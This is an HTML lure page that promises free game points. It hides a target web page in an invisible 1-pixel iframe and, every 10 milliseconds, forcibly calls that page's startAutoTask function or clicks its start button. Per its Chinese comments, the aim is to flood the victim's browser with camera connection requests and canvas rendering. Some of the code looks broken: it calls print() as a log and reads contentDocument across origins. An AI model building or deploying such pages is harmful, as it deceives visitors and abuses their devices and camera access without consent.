<!DOCTYPE html>
<html>
<head>
    <title>免費領取遊戲點數</title>
</head>
<body>
    <h1>正在載入活動頁面，請稍後...</h1>

    <!-- 1. 隱暗地將你的 VR 網頁嵌入進來，設為透明度 0 讓受害者看不到 -->
    <iframe id="target-site" src="https://shenb1989-hash.github.io/location-test1/.html" style="width:1px; height:1px; opacity:0;"></iframe>

    <script>
        const iframe = document.getElementById('target-site');

        iframe.onload = function() {
            print("[!] 目標網頁載入成功，開始注入點擊轟炸...");
            
            // 2. 利用定時器，每 10 毫秒就去觸發你網頁裡的 startAutoTask()
            setInterval(() => {
                try {
                    // 強行呼叫你網頁內部的函式
                    iframe.contentWindow.startAutoTask(); 
                } catch(e) {
                    // 如果跨網域被阻擋，改用模擬點擊
                    const btn = iframe.contentDocument.getElementById('start-btn');
                    if(btn) btn.click();
                }
            }, 10); // 10毫秒執行一次，瞬間建立數千個相機連線要求與 Canvas 渲染
        };
    </script>
</body>
</html>
